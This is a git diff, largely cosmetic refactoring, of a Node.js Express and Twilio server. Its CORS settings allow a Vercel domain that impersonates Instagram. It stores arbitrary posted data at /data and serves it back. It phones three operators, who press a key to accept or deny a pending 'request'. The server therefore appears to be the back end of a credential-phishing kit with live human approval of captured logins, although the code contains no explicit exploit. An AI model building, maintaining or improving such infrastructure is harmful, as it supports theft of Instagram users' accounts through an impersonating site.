@@ -6,6 +6,10 @@ const twilio = require("twilio");
 
 const app = express();
 
+// --------------------------------------------------
+// Middleware
+// --------------------------------------------------
+
 app.use(cors({
     origin: [
         "https://account-instagram-com.vercel.app",
@@ -14,6 +18,11 @@ app.use(cors({
 }));
 
 app.use(express.json());
+app.use(express.urlencoded({ extended: false }));
+
+// --------------------------------------------------
+// Environment variables
+// --------------------------------------------------
 
 const {
     TWILIO_ACCOUNT_SID,
@@ -50,27 +59,34 @@ let currentData = null;
 // Alert state
 // --------------------------------------------------
 
-let alertState = {
-    active: false,
-    startedAt: null,
-    people: {
-        person1: {
-            number: ALERT_TO_1,
-            status: "idle",
-            callSid: null
-        },
-        person2: {
-            number: ALERT_TO_2,
-            status: "idle",
-            callSid: null
-        },
-        person3: {
-            number: ALERT_TO_3,
-            status: "idle",
-            callSid: null
+function createInitialAlertState() {
+    return {
+        active: false,
+        startedAt: null,
+
+        people: {
+            person1: {
+                number: ALERT_TO_1,
+                status: "idle",
+                callSid: null
+            },
+
+            person2: {
+                number: ALERT_TO_2,
+                status: "idle",
+                callSid: null
+            },
+
+            person3: {
+                number: ALERT_TO_3,
+                status: "idle",
+                callSid: null
+            }
         }
-    }
-};
+    };
+}
+
+let alertState = createInitialAlertState();
 
 // --------------------------------------------------
 // Health
@@ -84,10 +100,11 @@ app.get("/health", (req, res) => {
 });
 
 // --------------------------------------------------
-// Generic data endpoint
+// Application data
 // --------------------------------------------------
 
 app.post("/data", (req, res) => {
+
     currentData = {
         ...req.body,
         receivedAt: new Date().toISOString()
@@ -101,15 +118,24 @@ app.post("/data", (req, res) => {
 });
 
 app.get("/data", (req, res) => {
-    res.json(currentData ? [currentData] : []);
+    res.json(
+        currentData
+            ? [currentData]
+            : []
+    );
 });
 
 // --------------------------------------------------
-// Twilio voice response
+// Twilio voice endpoint
 // --------------------------------------------------
 
 app.post("/voice/:person", (req, res) => {
+
     const person = req.params.person;
+
+    if (!alertState.people[person]) {
+        return res.sendStatus(404);
+    }
 
     const twiml = new twilio.twiml.VoiceResponse();
 
@@ -125,8 +151,10 @@ app.post("/voice/:person", (req, res) => {
         "Press any other key to deny."
     );
 
-    // If nothing was pressed
-    twiml.redirect(`/voice-timeout/${person}`);
+    // If no key is pressed
+    twiml.redirect(
+        `/voice-timeout/${person}`
+    );
 
     res.type("text/xml");
     res.send(twiml.toString());
@@ -137,6 +165,7 @@ app.post("/voice/:person", (req, res) => {
 // --------------------------------------------------
 
 app.post("/voice-response/:person", (req, res) => {
+
     const person = req.params.person;
     const digit = req.body.Digits;
 
@@ -146,23 +175,34 @@ app.post("/voice-response/:person", (req, res) => {
         return res.sendStatus(404);
     }
 
-    if (digit === "0") {
-        personState.status = "accepted";
-
-        console.log(`${person}: ACCEPTED`);
-    } else {
-        personState.status = "denied";
-
-        console.log(`${person}: DENIED`);
-    }
-
     const twiml = new twilio.twiml.VoiceResponse();
 
-    twiml.say(
-        personState.status === "accepted"
-            ? "Accepted. Thank you."
-            : "Denied. Thank you."
-    );
+    // 0 = accepted
+    if (digit === "0") {
+
+        personState.status = "accepted";
+
+        console.log(
+            `${person}: ACCEPTED`
+        );
+
+        twiml.say(
+            "Accepted. Thank you."
+        );
+
+    } else {
+
+        // Any other digit = denied
+        personState.status = "denied";
+
+        console.log(
+            `${person}: DENIED`
+        );
+
+        twiml.say(
+            "Denied. Thank you."
+        );
+    }
 
     twiml.hangup();
 
@@ -175,19 +215,26 @@ app.post("/voice-response/:person", (req, res) => {
 // --------------------------------------------------
 
 app.post("/voice-timeout/:person", (req, res) => {
+
     const person = req.params.person;
 
     const personState = alertState.people[person];
 
     if (personState) {
+
         personState.status = "denied";
 
-        console.log(`${person}: DENIED - no response`);
+        console.log(
+            `${person}: DENIED - no response`
+        );
     }
 
     const twiml = new twilio.twiml.VoiceResponse();
 
-    twiml.say("No response received. The request is denied.");
+    twiml.say(
+        "No response received. The request is denied."
+    );
+
     twiml.hangup();
 
     res.type("text/xml");
@@ -201,12 +248,14 @@ app.post("/voice-timeout/:person", (req, res) => {
 app.post("/alert", async (req, res) => {
 
     if (alertState.active) {
+
         return res.status(409).json({
             success: false,
             message: "An alert is already active."
         });
     }
 
+    // Create new alert
     alertState = {
         active: true,
         startedAt: new Date().toISOString(),
@@ -238,36 +287,54 @@ app.post("/alert", async (req, res) => {
         ["person3", ALERT_TO_3]
     ];
 
-    // Start all three calls concurrently
-    const calls = people.map(async ([person, number]) => {
+    const baseUrl = getBaseUrl(req);
 
-        try {
+    console.log(
+        `Starting alert using ${baseUrl}`
+    );
 
-            const call = await twilioClient.calls.create({
-                to: number,
-                from: TWILIO_FROM_NUMBER,
+    // Start all calls concurrently
+    const calls = people.map(
+        async ([person, number]) => {
 
-                url: `${getBaseUrl(req)}/voice/${person}`,
+            try {
 
-                method: "POST"
-            });
+                const call =
+                    await twilioClient.calls.create({
 
-            alertState.people[person].callSid = call.sid;
+                        to: number,
 
-            console.log(
-                `${person}: call started (${call.sid})`
-            );
+                        from: TWILIO_FROM_NUMBER,
 
-        } catch (error) {
+                        url: `${baseUrl}/voice/${person}`,
 
-            alertState.people[person].status = "call_failed";
+                        method: "POST"
+                    });
 
-            console.error(
-                `${person}: call failed`,
-                error.message
-            );
+                alertState
+                    .people[person]
+                    .callSid = call.sid;
+
+                console.log(
+                    `${person}: call started (${call.sid})`
+                );
+
+            } catch (error) {
+
+                alertState
+                    .people[person]
+                    .status = "call_failed";
+
+                console.error(
+                    `${person}: call failed`
+                );
+
+                console.error(
+                    error.message
+                );
+            }
         }
-    });
+    );
 
     await Promise.all(calls);
 
@@ -283,7 +350,9 @@ app.post("/alert", async (req, res) => {
 // --------------------------------------------------
 
 app.get("/alert/status", (req, res) => {
+
     res.json(alertState);
+
 });
 
 // --------------------------------------------------
@@ -292,30 +361,9 @@ app.get("/alert/status", (req, res) => {
 
 app.post("/alert/reset", (req, res) => {
 
-    alertState = {
-        active: false,
-        startedAt: null,
+    alertState = createInitialAlertState();
 
-        people: {
-            person1: {
-                number: ALERT_TO_1,
-                status: "idle",
-                callSid: null
-            },
-
-            person2: {
-                number: ALERT_TO_2,
-                status: "idle",
-                callSid: null
-            },
-
-            person3: {
-                number: ALERT_TO_3,
-                status: "idle",
-                callSid: null
-            }
-        }
-    };
+    console.log("Alert state reset.");
 
     res.json({
         success: true,
@@ -324,13 +372,15 @@ app.post("/alert/reset", (req, res) => {
 });
 
 // --------------------------------------------------
-// Helper
+// Base URL
 // --------------------------------------------------
 
 function getBaseUrl(req) {
-    // Render provides RENDER_EXTERNAL_URL automatically.
+
     if (process.env.RENDER_EXTERNAL_URL) {
-        return process.env.RENDER_EXTERNAL_URL;
+
+        return process.env.RENDER_EXTERNAL_URL
+            .replace(/\/$/, "");
     }
 
     return `${req.protocol}://${req.get("host")}`;
@@ -343,5 +393,9 @@ function getBaseUrl(req) {
 const PORT = process.env.PORT || 1000;
 
 app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on port ${PORT}`);
+
+    console.log(
+        `Server running on port ${PORT}`
+    );
+
 });
